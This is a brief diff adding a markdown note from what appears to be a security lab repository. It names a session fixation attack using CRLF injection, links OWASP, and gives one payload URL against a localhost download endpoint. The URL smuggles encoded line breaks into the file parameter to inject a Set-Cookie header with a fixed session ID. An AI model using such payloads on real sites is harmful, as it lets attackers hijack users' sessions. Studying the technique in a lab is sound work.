@@ -1,0 +1,6 @@
+# check the PDF in the main repo 
+
+## this attack called session fixation attack using CLRF https://owasp.org/www-community/attacks/Session_fixation
+
+
+http://127.0.0.1:5000/download?file=userinfo.txt%0d%0aSet-Cookie:%20session=e9bd28ac4671dbd3fb310f1db1e5434c%0aX-Injected:%20header
